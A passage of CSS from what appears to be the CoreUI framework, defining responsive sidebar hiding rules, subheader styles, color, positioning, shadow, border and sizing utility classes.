            *[dir="rtl"] .sidebar:not(.show).sidebar-self-hiding.sidebar-narrow-unfoldable.sidebar-end {
                margin-left: calc(var(--cui-sidebar-narrow-width) * -1);
            }
            @media (max-width: 575.98px) {
                html:not([dir="rtl"]) .sidebar:not(.show).sidebar-self-hiding-sm.sidebar-narrow:not(.sidebar-end),
                html:not([dir="rtl"]) .sidebar:not(.show).sidebar-self-hiding-sm.sidebar-narrow-unfoldable:not(.sidebar-end) {
                    margin-left: calc(var(--cui-sidebar-narrow-width) * -1);
                }
                *[dir="rtl"] .sidebar:not(.show).sidebar-self-hiding-sm.sidebar-narrow:not(.sidebar-end),
                *[dir="rtl"] .sidebar:not(.show).sidebar-self-hiding-sm.sidebar-narrow-unfoldable:not(.sidebar-end) {
                    margin-right: calc(var(--cui-sidebar-narrow-width) * -1);
                }
                html:not([dir="rtl"]) .sidebar:not(.show).sidebar-self-hiding-sm.sidebar-narrow.sidebar-end,
                html:not([dir="rtl"]) .sidebar:not(.show).sidebar-self-hiding-sm.sidebar-narrow-unfoldable.sidebar-end {
                    margin-right: calc(var(--cui-sidebar-narrow-width) * -1);
                }
                *[dir="rtl"] .sidebar:not(.show).sidebar-self-hiding-sm.sidebar-narrow.sidebar-end,
                *[dir="rtl"] .sidebar:not(.show).sidebar-self-hiding-sm.sidebar-narrow-unfoldable.sidebar-end {
                    margin-left: calc(var(--cui-sidebar-narrow-width) * -1);
                }
            }
            @media (max-width: 767.98px) {
                html:not([dir="rtl"]) .sidebar:not(.show).sidebar-self-hiding-md.sidebar-narrow:not(.sidebar-end),
                html:not([dir="rtl"]) .sidebar:not(.show).sidebar-self-hiding-md.sidebar-narrow-unfoldable:not(.sidebar-end) {
                    margin-left: calc(var(--cui-sidebar-narrow-width) * -1);
                }
                *[dir="rtl"] .sidebar:not(.show).sidebar-self-hiding-md.sidebar-narrow:not(.sidebar-end),
                *[dir="rtl"] .sidebar:not(.show).sidebar-self-hiding-md.sidebar-narrow-unfoldable:not(.sidebar-end) {
                    margin-right: calc(var(--cui-sidebar-narrow-width) * -1);
                }
                html:not([dir="rtl"]) .sidebar:not(.show).sidebar-self-hiding-md.sidebar-narrow.sidebar-end,
                html:not([dir="rtl"]) .sidebar:not(.show).sidebar-self-hiding-md.sidebar-narrow-unfoldable.sidebar-end {
                    margin-right: calc(var(--cui-sidebar-narrow-width) * -1);
                }
                *[dir="rtl"] .sidebar:not(.show).sidebar-self-hiding-md.sidebar-narrow.sidebar-end,
                *[dir="rtl"] .sidebar:not(.show).sidebar-self-hiding-md.sidebar-narrow-unfoldable.sidebar-end {
                    margin-left: calc(var(--cui-sidebar-narrow-width) * -1);
                }
            }
            @media (max-width: 991.98px) {
                html:not([dir="rtl"]) .sidebar:not(.show).sidebar-self-hiding-lg.sidebar-narrow:not(.sidebar-end),
                html:not([dir="rtl"]) .sidebar:not(.show).sidebar-self-hiding-lg.sidebar-narrow-unfoldable:not(.sidebar-end) {
                    margin-left: calc(var(--cui-sidebar-narrow-width) * -1);
                }
                *[dir="rtl"] .sidebar:not(.show).sidebar-self-hiding-lg.sidebar-narrow:not(.sidebar-end),
                *[dir="rtl"] .sidebar:not(.show).sidebar-self-hiding-lg.sidebar-narrow-unfoldable:not(.sidebar-end) {
                    margin-right: calc(var(--cui-sidebar-narrow-width) * -1);
                }
                html:not([dir="rtl"]) .sidebar:not(.show).sidebar-self-hiding-lg.sidebar-narrow.sidebar-end,
                html:not([dir="rtl"]) .sidebar:not(.show).sidebar-self-hiding-lg.sidebar-narrow-unfoldable.sidebar-end {
                    margin-right: calc(var(--cui-sidebar-narrow-width) * -1);
                }
                *[dir="rtl"] .sidebar:not(.show).sidebar-self-hiding-lg.sidebar-narrow.sidebar-end,
                *[dir="rtl"] .sidebar:not(.show).sidebar-self-hiding-lg.sidebar-narrow-unfoldable.sidebar-end {
                    margin-left: calc(var(--cui-sidebar-narrow-width) * -1);
                }
            }
            @media (max-width: 1199.98px) {
                html:not([dir="rtl"]) .sidebar:not(.show).sidebar-self-hiding-xl.sidebar-narrow:not(.sidebar-end),
                html:not([dir="rtl"]) .sidebar:not(.show).sidebar-self-hiding-xl.sidebar-narrow-unfoldable:not(.sidebar-end) {
                    margin-left: calc(var(--cui-sidebar-narrow-width) * -1);
                }
                *[dir="rtl"] .sidebar:not(.show).sidebar-self-hiding-xl.sidebar-narrow:not(.sidebar-end),
                *[dir="rtl"] .sidebar:not(.show).sidebar-self-hiding-xl.sidebar-narrow-unfoldable:not(.sidebar-end) {
                    margin-right: calc(var(--cui-sidebar-narrow-width) * -1);
                }
                html:not([dir="rtl"]) .sidebar:not(.show).sidebar-self-hiding-xl.sidebar-narrow.sidebar-end,
                html:not([dir="rtl"]) .sidebar:not(.show).sidebar-self-hiding-xl.sidebar-narrow-unfoldable.sidebar-end {
                    margin-right: calc(var(--cui-sidebar-narrow-width) * -1);
                }
                *[dir="rtl"] .sidebar:not(.show).sidebar-self-hiding-xl.sidebar-narrow.sidebar-end,
                *[dir="rtl"] .sidebar:not(.show).sidebar-self-hiding-xl.sidebar-narrow-unfoldable.sidebar-end {
                    margin-left: calc(var(--cui-sidebar-narrow-width) * -1);
                }
            }
            @media (max-width: 1399.98px) {
                html:not([dir="rtl"]) .sidebar:not(.show).sidebar-self-hiding-xxl.sidebar-narrow:not(.sidebar-end),
                html:not([dir="rtl"]) .sidebar:not(.show).sidebar-self-hiding-xxl.sidebar-narrow-unfoldable:not(.sidebar-end) {
                    margin-left: calc(var(--cui-sidebar-narrow-width) * -1);
                }
                *[dir="rtl"] .sidebar:not(.show).sidebar-self-hiding-xxl.sidebar-narrow:not(.sidebar-end),
                *[dir="rtl"] .sidebar:not(.show).sidebar-self-hiding-xxl.sidebar-narrow-unfoldable:not(.sidebar-end) {
                    margin-right: calc(var(--cui-sidebar-narrow-width) * -1);
                }
                html:not([dir="rtl"]) .sidebar:not(.show).sidebar-self-hiding-xxl.sidebar-narrow.sidebar-end,
                html:not([dir="rtl"]) .sidebar:not(.show).sidebar-self-hiding-xxl.sidebar-narrow-unfoldable.sidebar-end {
                    margin-right: calc(var(--cui-sidebar-narrow-width) * -1);
                }
                *[dir="rtl"] .sidebar:not(.show).sidebar-self-hiding-xxl.sidebar-narrow.sidebar-end,
                *[dir="rtl"] .sidebar:not(.show).sidebar-self-hiding-xxl.sidebar-narrow-unfoldable.sidebar-end {
                    margin-left: calc(var(--cui-sidebar-narrow-width) * -1);
                }
            }
            .subheader {
                position: relative;
                display: flex;
                flex-wrap: wrap;
                align-items: center;
                justify-content: space-between;
                min-height: 3rem;
                padding: 0.5rem 1rem;
                background: var(--cui-subheader-bg, #fff);
                border-bottom: var(--cui-subheader-border-width, 1px) solid var(--cui-subheader-border-color, #d8dbe0);
            }
            .subheader-sticky {
                position: -webkit-sticky;
                position: sticky;
                top: 0;
                z-index: 1029;
                box-shadow: 0 2px 2px 0 rgba(var(--cui-elevation-base-color, 60, 75, 100), 0.14), 0 3px 1px -2px rgba(var(--cui-elevation-base-color, 60, 75, 100), 0.12), 0 1px 5px 0 rgba(var(--cui-elevation-base-color, 60, 75, 100), 0.2);
            }
            .subheader-sticky:not([class*="border"]) {
                border: 0;
            }
            .subheader-nav {
                display: flex;
                flex-direction: row;
                margin-bottom: 0;
                list-style: none;
            }
            html:not([dir="rtl"]) .subheader-nav {
                padding-left: 0;
            }
            *[dir="rtl"] .subheader-nav {
                padding-right: 0;
            }
            .subheader-nav .nav-link {
                padding-right: 0.5rem;
                padding-left: 0.5rem;
                color: var(--cui-subheader-color, rgba(44, 56, 74, 0.681));
            }
            .subheader-nav .nav-link:hover,
            .subheader-nav .nav-link:focus {
                color: var(--cui-subheader-hover-color, rgba(44, 56, 74, 0.95));
            }
            .subheader-nav .nav-link.disabled {
                color: var(--cui-subheader-disabled-color, rgba(44, 56, 74, 0.38));
            }
            .subheader-nav .show > .nav-link,
            .subheader-nav .nav-link.active {
                color: var(--cui-subheader-active-color, rgba(44, 56, 74, 0.95));
            }
            .subheader-nav .dropdown-menu {
                position: absolute;
            }
            .subheader-text {
                padding-top: 0.5rem;
                padding-bottom: 0.5rem;
                color: var(--cui-subheader-color, rgba(44, 56, 74, 0.681));
            }
            .subheader-text a {
                color: var(--cui-subheader-active-color, rgba(44, 56, 74, 0.95));
            }
            .subheader-text a:hover,
            .subheader-text a:focus {
                color: var(--cui-subheader-active-color, rgba(44, 56, 74, 0.95));
            }
            .clearfix::after {
                display: block;
                clear: both;
                content: "";
            }
            .text-bg-primary {
                color: rgba(255, 255, 255, 0.87) !important;
                background-color: RGBA(50, 31, 219, var(--cui-bg-opacity, 1)) !important;
            }
            .text-bg-secondary {
                color: #000015 !important;
                background-color: RGBA(157, 165, 177, var(--cui-bg-opacity, 1)) !important;
            }
            .text-bg-success {
                color: #000015 !important;
                background-color: RGBA(46, 184, 92, var(--cui-bg-opacity, 1)) !important;
            }
            .text-bg-info {
                color: #000015 !important;
                background-color: RGBA(51, 153, 255, var(--cui-bg-opacity, 1)) !important;
            }
            .text-bg-warning {
                color: rgba(44, 56, 74, 0.95) !important;
                background-color: RGBA(249, 177, 21, var(--cui-bg-opacity, 1)) !important;
            }
            .text-bg-danger {
                color: #000015 !important;
                background-color: RGBA(229, 83, 83, var(--cui-bg-opacity, 1)) !important;
            }
            .text-bg-light {
                color: rgba(44, 56, 74, 0.95) !important;
                background-color: RGBA(235, 237, 239, var(--cui-bg-opacity, 1)) !important;
            }
            .text-bg-dark {
                color: rgba(255, 255, 255, 0.87) !important;
                background-color: RGBA(79, 93, 115, var(--cui-bg-opacity, 1)) !important;
            }
            .link-primary {
                color: #321fdb !important;
            }
            .link-primary:hover,
            .link-primary:focus {
                color: #5b4ce2 !important;
            }
            .link-secondary {
                color: #9da5b1 !important;
            }
            .link-secondary:hover,
            .link-secondary:focus {
                color: #b1b7c1 !important;
            }
            .link-success {
                color: #2eb85c !important;
            }
            .link-success:hover,
            .link-success:focus {
                color: #58c67d !important;
            }
            .link-info {
                color: #39f !important;
            }
            .link-info:hover,
            .link-info:focus {
                color: #5cadff !important;
            }
            .link-warning {
                color: #f9b115 !important;
            }
            .link-warning:hover,
            .link-warning:focus {
                color: #c78e11 !important;
            }
            .link-danger {
                color: #e55353 !important;
            }
            .link-danger:hover,
            .link-danger:focus {
                color: #ea7575 !important;
            }
            .link-light {
                color: #ebedef !important;
            }
            .link-light:hover,
            .link-light:focus {
                color: #bcbebf !important;
            }
            .link-dark {
                color: #4f5d73 !important;
            }
            .link-dark:hover,
            .link-dark:focus {
                color: #727d8f !important;
            }
            .ratio {
                position: relative;
                width: 100%;
            }
            .ratio::before {
                display: block;
                padding-top: var(--cui-aspect-ratio);
                content: "";
            }
            .ratio > * {
                position: absolute;
                top: 0;
                width: 100%;
                height: 100%;
            }
            html:not([dir="rtl"]) .ratio > * {
                left: 0;
            }
            *[dir="rtl"] .ratio > * {
                right: 0;
            }
            .ratio-1x1 {
                --cui-aspect-ratio: 100%;
            }
            .ratio-4x3 {
                --cui-aspect-ratio: 75%;
            }
            .ratio-16x9 {
                --cui-aspect-ratio: 56.25%;
            }
            .ratio-21x9 {
                --cui-aspect-ratio: 42.8571428571%;
            }
            .fixed-top {
                position: fixed;
                top: 0;
                right: 0;
                left: 0;
                z-index: 1030;
            }
            .fixed-bottom {
                position: fixed;
                right: 0;
                bottom: 0;
                left: 0;
                z-index: 1030;
            }
            .sticky-top {
                position: -webkit-sticky;
                position: sticky;
                top: 0;
                z-index: 1020;
            }
            .sticky-bottom {
                position: -webkit-sticky;
                position: sticky;
                bottom: 0;
                z-index: 1020;
            }
            @media (min-width: 576px) {
                .sticky-sm-top {
                    position: -webkit-sticky;
                    position: sticky;
                    top: 0;
                    z-index: 1020;
                }
                .sticky-sm-bottom {
                    position: -webkit-sticky;
                    position: sticky;
                    bottom: 0;
                    z-index: 1020;
                }
            }
            @media (min-width: 768px) {
                .sticky-md-top {
                    position: -webkit-sticky;
                    position: sticky;
                    top: 0;
                    z-index: 1020;
                }
                .sticky-md-bottom {
                    position: -webkit-sticky;
                    position: sticky;
                    bottom: 0;
                    z-index: 1020;
                }
            }
            @media (min-width: 992px) {
                .sticky-lg-top {
                    position: -webkit-sticky;
                    position: sticky;
                    top: 0;
                    z-index: 1020;
                }
                .sticky-lg-bottom {
                    position: -webkit-sticky;
                    position: sticky;
                    bottom: 0;
                    z-index: 1020;
                }
            }
            @media (min-width: 1200px) {
                .sticky-xl-top {
                    position: -webkit-sticky;
                    position: sticky;
                    top: 0;
                    z-index: 1020;
                }
                .sticky-xl-bottom {
                    position: -webkit-sticky;
                    position: sticky;
                    bottom: 0;
                    z-index: 1020;
                }
            }
            @media (min-width: 1400px) {
                .sticky-xxl-top {
                    position: -webkit-sticky;
                    position: sticky;
                    top: 0;
                    z-index: 1020;
                }
                .sticky-xxl-bottom {
                    position: -webkit-sticky;
                    position: sticky;
                    bottom: 0;
                    z-index: 1020;
                }
            }
            .hstack {
                display: flex;
                flex-direction: row;
                align-items: center;
                align-self: stretch;
            }
            .vstack {
                display: flex;
                flex: 1 1 auto;
                flex-direction: column;
                align-self: stretch;
            }
            .visually-hidden,
            .visually-hidden-focusable:not(:focus):not(:focus-within) {
                position: absolute !important;
                width: 1px !important;
                height: 1px !important;
                padding: 0 !important;
                margin: -1px !important;
                overflow: hidden !important;
                clip: rect(0, 0, 0, 0) !important;
                white-space: nowrap !important;
                border: 0 !important;
            }
            .stretched-link::after {
                position: absolute;
                top: 0;
                right: 0;
                bottom: 0;
                left: 0;
                z-index: 1;
                content: "";
            }
            .text-truncate {
                overflow: hidden;
                text-overflow: ellipsis;
                white-space: nowrap;
            }
            .vr {
                display: inline-block;
                align-self: stretch;
                width: 1px;
                min-height: 1em;
                padding: 0;
                background-color: currentcolor;
                opacity: 0.25;
            }
            .align-baseline {
                vertical-align: baseline !important;
            }
            .align-top {
                vertical-align: top !important;
            }
            .align-middle {
                vertical-align: middle !important;
            }
            .align-bottom {
                vertical-align: bottom !important;
            }
            .align-text-bottom {
                vertical-align: text-bottom !important;
            }
            .align-text-top {
                vertical-align: text-top !important;
            }
            html:not([dir="rtl"]) .float-start {
                float: left !important;
            }
            *[dir="rtl"] .float-start {
                float: right !important;
            }
            html:not([dir="rtl"]) .float-end {
                float: right !important;
            }
            *[dir="rtl"] .float-end {
                float: left !important;
            }
            html:not([dir="rtl"]) .float-none {
                float: none !important;
            }
            *[dir="rtl"] .float-none {
                float: none !important;
            }
            .opacity-0 {
                opacity: 0 !important;
            }
            .opacity-25 {
                opacity: 0.25 !important;
            }
            .opacity-50 {
                opacity: 0.5 !important;
            }
            .opacity-75 {
                opacity: 0.75 !important;
            }
            .opacity-100 {
                opacity: 1 !important;
            }
            .overflow-auto {
                overflow: auto !important;
            }
            .overflow-hidden {
                overflow: hidden !important;
            }
            .overflow-visible {
                overflow: visible !important;
            }
            .overflow-scroll {
                overflow: scroll !important;
            }
            .d-inline {
                display: inline !important;
            }
            .d-inline-block {
                display: inline-block !important;
            }
            .d-block {
                display: block !important;
            }
            .d-grid {
                display: grid !important;
            }
            .d-table {
                display: table !important;
            }
            .d-table-row {
                display: table-row !important;
            }
            .d-table-cell {
                display: table-cell !important;
            }
            .d-flex {
                display: flex !important;
            }
            .d-inline-flex {
                display: inline-flex !important;
            }
            .d-none {
                display: none !important;
            }
            .shadow {
                box-shadow: 0 0.5rem 1rem rgba(0, 0, 21, 0.15) !important;
            }
            .shadow-sm {
                box-shadow: 0 0.125rem 0.25rem rgba(0, 0, 21, 0.075) !important;
            }
            .shadow-lg {
                box-shadow: 0 1rem 3rem rgba(0, 0, 21, 0.175) !important;
            }
            .shadow-none {
                box-shadow: none !important;
            }
            .elevation-0 {
                box-shadow: none !important;
            }
            .elevation-1 {
                box-shadow: 0 1px 1px 0 rgba(var(--cui-elevation-base-color, 60, 75, 100), 0.14), 0 2px 1px -1px rgba(var(--cui-elevation-base-color, 60, 75, 100), 0.12), 0 1px 3px 0 rgba(var(--cui-elevation-base-color, 60, 75, 100), 0.2) !important;
            }
            .elevation-2 {
                box-shadow: 0 2px 2px 0 rgba(var(--cui-elevation-base-color, 60, 75, 100), 0.14), 0 3px 1px -2px rgba(var(--cui-elevation-base-color, 60, 75, 100), 0.12), 0 1px 5px 0 rgba(var(--cui-elevation-base-color, 60, 75, 100), 0.2) !important;
            }
            .elevation-3 {
                box-shadow: 0 3px 4px 0 rgba(var(--cui-elevation-base-color, 60, 75, 100), 0.14), 0 3px 3px -2px rgba(var(--cui-elevation-base-color, 60, 75, 100), 0.12), 0 1px 8px 0 rgba(var(--cui-elevation-base-color, 60, 75, 100), 0.2) !important;
            }
            .elevation-4 {
                box-shadow: 0 4px 5px 0 rgba(var(--cui-elevation-base-color, 60, 75, 100), 0.14), 0 1px 10px 0 rgba(var(--cui-elevation-base-color, 60, 75, 100), 0.12), 0 2px 4px -1px rgba(var(--cui-elevation-base-color, 60, 75, 100), 0.2) !important;
            }
            .elevation-6 {
                box-shadow: 0 6px 10px 0 rgba(var(--cui-elevation-base-color, 60, 75, 100), 0.14), 0 1px 18px 0 rgba(var(--cui-elevation-base-color, 60, 75, 100), 0.12), 0 3px 5px -1px rgba(var(--cui-elevation-base-color, 60, 75, 100), 0.2) !important;
            }
            .elevation-8 {
                box-shadow: 0 8px 10px 1px rgba(var(--cui-elevation-base-color, 60, 75, 100), 0.14), 0 3px 14px 2px rgba(var(--cui-elevation-base-color, 60, 75, 100), 0.12),
                    0 5px 5px -3px rgba(var(--cui-elevation-base-color, 60, 75, 100), 0.2) !important;
            }
            .elevation-9 {
                box-shadow: 0 9px 12px 1px rgba(var(--cui-elevation-base-color, 60, 75, 100), 0.14), 0 3px 16px 2px rgba(var(--cui-elevation-base-color, 60, 75, 100), 0.12),
                    0 5px 6px -3px rgba(var(--cui-elevation-base-color, 60, 75, 100), 0.2) !important;
            }
            .elevation-12 {
                box-shadow: 0 12px 17px 2px rgba(var(--cui-elevation-base-color, 60, 75, 100), 0.14), 0 5px 22px 4px rgba(var(--cui-elevation-base-color, 60, 75, 100), 0.12),
                    0 7px 8px -4px rgba(var(--cui-elevation-base-color, 60, 75, 100), 0.2) !important;
            }
            .elevation-16 {
                box-shadow: 0 16px 24px 2px rgba(var(--cui-elevation-base-color, 60, 75, 100), 0.14), 0 6px 30px 5px rgba(var(--cui-elevation-base-color, 60, 75, 100), 0.12),
                    0 8px 10px -5px rgba(var(--cui-elevation-base-color, 60, 75, 100), 0.2) !important;
            }
            .elevation-24 {
                box-shadow: 0 24px 38px 3px rgba(var(--cui-elevation-base-color, 60, 75, 100), 0.14), 0 9px 46px 8px rgba(var(--cui-elevation-base-color, 60, 75, 100), 0.12),
                    0 11px 15px -7px rgba(var(--cui-elevation-base-color, 60, 75, 100), 0.2) !important;
            }
            .position-static {
                position: static !important;
            }
            .position-relative {
                position: relative !important;
            }
            .position-absolute {
                position: absolute !important;
            }
            .position-fixed {
                position: fixed !important;
            }
            .position-sticky {
                position: -webkit-sticky !important;
                position: sticky !important;
            }
            .top-0 {
                top: 0 !important;
            }
            .top-50 {
                top: 50% !important;
            }
            .top-100 {
                top: 100% !important;
            }
            .bottom-0 {
                bottom: 0 !important;
            }
            .bottom-50 {
                bottom: 50% !important;
            }
            .bottom-100 {
                bottom: 100% !important;
            }
            .start-0 {
                left: 0 !important;
            }
            .start-50 {
                left: 50% !important;
            }
            .start-100 {
                left: 100% !important;
            }
            .end-0 {
                right: 0 !important;
            }
            .end-50 {
                right: 50% !important;
            }
            .end-100 {
                right: 100% !important;
            }
            .translate-middle {
                transform: translate(-50%, -50%) !important;
            }
            .translate-middle-x {
                transform: translateX(-50%) !important;
            }
            .translate-middle-y {
                transform: translateY(-50%) !important;
            }
            .border {
                border: var(--cui-border-width) var(--cui-border-style) var(--cui-border-color) !important;
            }
            .border-0 {
                border: 0 !important;
            }
            .border-top {
                border-top: var(--cui-border-width) var(--cui-border-style) var(--cui-border-color) !important;
            }
            .border-top-0 {
                border-top: 0 !important;
            }
            html:not([dir="rtl"]) .border-end {
                border-right: var(--cui-border-width) var(--cui-border-style) var(--cui-border-color) !important;
            }
            *[dir="rtl"] .border-end {
                border-left: var(--cui-border-width) var(--cui-border-style) var(--cui-border-color) !important;
            }
            html:not([dir="rtl"]) .border-end-0 {
                border-right: 0 !important;
            }
            *[dir="rtl"] .border-end-0 {
                border-left: 0 !important;
            }
            .border-bottom {
                border-bottom: var(--cui-border-width) var(--cui-border-style) var(--cui-border-color) !important;
            }
            .border-bottom-0 {
                border-bottom: 0 !important;
            }
            html:not([dir="rtl"]) .border-start {
                border-left: var(--cui-border-width) var(--cui-border-style) var(--cui-border-color) !important;
            }
            *[dir="rtl"] .border-start {
                border-right: var(--cui-border-width) var(--cui-border-style) var(--cui-border-color) !important;
            }
            html:not([dir="rtl"]) .border-start-0 {
                border-left: 0 !important;
            }
            *[dir="rtl"] .border-start-0 {
                border-right: 0 !important;
            }
            .border-primary {
                --cui-border-opacity: 1;
                border-color: rgba(var(--cui-primary-rgb), var(--cui-border-opacity)) !important;
            }
            .border-secondary {
                --cui-border-opacity: 1;
                border-color: rgba(var(--cui-secondary-rgb), var(--cui-border-opacity)) !important;
            }
            .border-success {
                --cui-border-opacity: 1;
                border-color: rgba(var(--cui-success-rgb), var(--cui-border-opacity)) !important;
            }
            .border-info {
                --cui-border-opacity: 1;
                border-color: rgba(var(--cui-info-rgb), var(--cui-border-opacity)) !important;
            }
            .border-warning {
                --cui-border-opacity: 1;
                border-color: rgba(var(--cui-warning-rgb), var(--cui-border-opacity)) !important;
            }
            .border-danger {
                --cui-border-opacity: 1;
                border-color: rgba(var(--cui-danger-rgb), var(--cui-border-opacity)) !important;
            }
            .border-light {
                --cui-border-opacity: 1;
                border-color: rgba(var(--cui-light-rgb), var(--cui-border-opacity)) !important;
            }
            .border-dark {
                --cui-border-opacity: 1;
                border-color: rgba(var(--cui-dark-rgb), var(--cui-border-opacity)) !important;
            }
            .border-white {
                --cui-border-opacity: 1;
                border-color: rgba(var(--cui-white-rgb), var(--cui-border-opacity)) !important;
            }
            .border-top-primary {
                border-top-color: #321fdb !important;
            }
            .border-top-secondary {
                border-top-color: #9da5b1 !important;
            }
            .border-top-success {
                border-top-color: #2eb85c !important;
            }
            .border-top-info {
                border-top-color: #39f !important;
            }
            .border-top-warning {
                border-top-color: #f9b115 !important;
            }
            .border-top-danger {
                border-top-color: #e55353 !important;
            }
            .border-top-light {
                border-top-color: #ebedef !important;
            }
            .border-top-dark {
                border-top-color: #4f5d73 !important;
            }
            .border-top-white {
                border-top-color: #fff !important;
            }
            html:not([dir="rtl"]) .border-end-primary {
                border-right-color: #321fdb !important;
            }
            *[dir="rtl"] .border-end-primary {
                border-left-color: #321fdb !important;
            }
            html:not([dir="rtl"]) .border-end-secondary {
                border-right-color: #9da5b1 !important;
            }
            *[dir="rtl"] .border-end-secondary {
                border-left-color: #9da5b1 !important;
            }
            html:not([dir="rtl"]) .border-end-success {
                border-right-color: #2eb85c !important;
            }
            *[dir="rtl"] .border-end-success {
                border-left-color: #2eb85c !important;
            }
            html:not([dir="rtl"]) .border-end-info {
                border-right-color: #39f !important;
            }
            *[dir="rtl"] .border-end-info {
                border-left-color: #39f !important;
            }
            html:not([dir="rtl"]) .border-end-warning {
                border-right-color: #f9b115 !important;
            }
            *[dir="rtl"] .border-end-warning {
                border-left-color: #f9b115 !important;
            }
            html:not([dir="rtl"]) .border-end-danger {
                border-right-color: #e55353 !important;
            }
            *[dir="rtl"] .border-end-danger {
                border-left-color: #e55353 !important;
            }
            html:not([dir="rtl"]) .border-end-light {
                border-right-color: #ebedef !important;
            }
            *[dir="rtl"] .border-end-light {
                border-left-color: #ebedef !important;
            }
            html:not([dir="rtl"]) .border-end-dark {
                border-right-color: #4f5d73 !important;
            }
            *[dir="rtl"] .border-end-dark {
                border-left-color: #4f5d73 !important;
            }
            html:not([dir="rtl"]) .border-end-white {
                border-right-color: #fff !important;
            }
            *[dir="rtl"] .border-end-white {
                border-left-color: #fff !important;
            }
            .border-bottom-primary {
                border-bottom-color: #321fdb !important;
            }
            .border-bottom-secondary {
                border-bottom-color: #9da5b1 !important;
            }
            .border-bottom-success {
                border-bottom-color: #2eb85c !important;
            }
            .border-bottom-info {
                border-bottom-color: #39f !important;
            }
            .border-bottom-warning {
                border-bottom-color: #f9b115 !important;
            }
            .border-bottom-danger {
                border-bottom-color: #e55353 !important;
            }
            .border-bottom-light {
                border-bottom-color: #ebedef !important;
            }
            .border-bottom-dark {
                border-bottom-color: #4f5d73 !important;
            }
            .border-bottom-white {
                border-bottom-color: #fff !important;
            }
            html:not([dir="rtl"]) .border-start-primary {
                border-left-color: #321fdb !important;
            }
            *[dir="rtl"] .border-start-primary {
                border-right-color: #321fdb !important;
            }
            html:not([dir="rtl"]) .border-start-secondary {
                border-left-color: #9da5b1 !important;
            }
            *[dir="rtl"] .border-start-secondary {
                border-right-color: #9da5b1 !important;
            }
            html:not([dir="rtl"]) .border-start-success {
                border-left-color: #2eb85c !important;
            }
            *[dir="rtl"] .border-start-success {
                border-right-color: #2eb85c !important;
            }
            html:not([dir="rtl"]) .border-start-info {
                border-left-color: #39f !important;
            }
            *[dir="rtl"] .border-start-info {
                border-right-color: #39f !important;
            }
            html:not([dir="rtl"]) .border-start-warning {
                border-left-color: #f9b115 !important;
            }
            *[dir="rtl"] .border-start-warning {
                border-right-color: #f9b115 !important;
            }
            html:not([dir="rtl"]) .border-start-danger {
                border-left-color: #e55353 !important;
            }
            *[dir="rtl"] .border-start-danger {
                border-right-color: #e55353 !important;
            }
            html:not([dir="rtl"]) .border-start-light {
                border-left-color: #ebedef !important;
            }
            *[dir="rtl"] .border-start-light {
                border-right-color: #ebedef !important;
            }
            html:not([dir="rtl"]) .border-start-dark {
                border-left-color: #4f5d73 !important;
            }
            *[dir="rtl"] .border-start-dark {
                border-right-color: #4f5d73 !important;
            }
            html:not([dir="rtl"]) .border-start-white {
                border-left-color: #fff !important;
            }
            *[dir="rtl"] .border-start-white {
                border-right-color: #fff !important;
            }
            .border-1 {
                --cui-border-width: 1px;
            }
            .border-2 {
                --cui-border-width: 2px;
            }
            .border-3 {
                --cui-border-width: 3px;
            }
            .border-4 {
                --cui-border-width: 4px;
            }
            .border-5 {
                --cui-border-width: 5px;
            }
            .border-top-1 {
                border-top-width: 1px !important;
            }
            .border-top-2 {
                border-top-width: 2px !important;
            }
            .border-top-3 {
                border-top-width: 3px !important;
            }
            .border-top-4 {
                border-top-width: 4px !important;
            }
            .border-top-5 {
                border-top-width: 5px !important;
            }
            html:not([dir="rtl"]) .border-end-1 {
                border-right-width: 1px !important;
            }
            *[dir="rtl"] .border-end-1 {
                border-left-width: 1px !important;
            }
            html:not([dir="rtl"]) .border-end-2 {
                border-right-width: 2px !important;
            }
            *[dir="rtl"] .border-end-2 {
                border-left-width: 2px !important;
            }
            html:not([dir="rtl"]) .border-end-3 {
                border-right-width: 3px !important;
            }
            *[dir="rtl"] .border-end-3 {
                border-left-width: 3px !important;
            }
            html:not([dir="rtl"]) .border-end-4 {
                border-right-width: 4px !important;
            }
            *[dir="rtl"] .border-end-4 {
                border-left-width: 4px !important;
            }
            html:not([dir="rtl"]) .border-end-5 {
                border-right-width: 5px !important;
            }
            *[dir="rtl"] .border-end-5 {
                border-left-width: 5px !important;
            }
            .border-bottom-1 {
                border-bottom-width: 1px !important;
            }
            .border-bottom-2 {
                border-bottom-width: 2px !important;
            }
            .border-bottom-3 {
                border-bottom-width: 3px !important;
            }
            .border-bottom-4 {
                border-bottom-width: 4px !important;
            }
            .border-bottom-5 {
                border-bottom-width: 5px !important;
            }
            html:not([dir="rtl"]) .border-start-1 {
                border-left-width: 1px !important;
            }
            *[dir="rtl"] .border-start-1 {
                border-right-width: 1px !important;
            }
            html:not([dir="rtl"]) .border-start-2 {
                border-left-width: 2px !important;
            }
            *[dir="rtl"] .border-start-2 {
                border-right-width: 2px !important;
            }
            html:not([dir="rtl"]) .border-start-3 {
                border-left-width: 3px !important;
            }
            *[dir="rtl"] .border-start-3 {
                border-right-width: 3px !important;
            }
            html:not([dir="rtl"]) .border-start-4 {
                border-left-width: 4px !important;
            }
            *[dir="rtl"] .border-start-4 {
                border-right-width: 4px !important;
            }
            html:not([dir="rtl"]) .border-start-5 {
                border-left-width: 5px !important;
            }
            *[dir="rtl"] .border-start-5 {
                border-right-width: 5px !important;
            }
            .border-opacity-10 {
                --cui-border-opacity: 0.1;
            }
            .border-opacity-25 {
                --cui-border-opacity: 0.25;
            }
            .border-opacity-50 {
                --cui-border-opacity: 0.5;
            }
            .border-opacity-75 {
                --cui-border-opacity: 0.75;
            }
            .border-opacity-100 {
                --cui-border-opacity: 1;
            }
            .w-25 {
                width: 25% !important;
            }
            .w-50 {
                width: 50% !important;
            }
            .w-75 {
                width: 75% !important;
            }
            .w-100 {
                width: 100% !important;
            }
            .w-auto {
                width: auto !important;
            }
            .mw-100 {
                max-width: 100% !important;
            }
            .vw-100 {
                width: 100vw !important;
            }
            .min-vw-100 {
                min-width: 100vw !important;
            }
            .h-25 {
                height: 25% !important;
            }
            .h-50 {
                height: 50% !important;
            }
            .h-75 {
                height: 75% !important;
            }
            .h-100 {
                height: 100% !important;
            }
            .h-auto {
                height: auto !important;
            }
            .mh-100 {
                max-height: 100% !important;
            }
            .vh-100 {
                height: 100vh !important;
            }
            .min-vh-100 {
                min-height: 100vh !important;
            }
            .flex-fill {
                flex: 1 1 auto !important;
            }
            .flex-row {
                flex-direction: row !important;
            }
            .flex-column {
                flex-direction: column !important;
            }
            .flex-row-reverse {
                flex-direction: row-reverse !important;
            }
            .flex-column-reverse {
                flex-direction: column-reverse !important;
            }
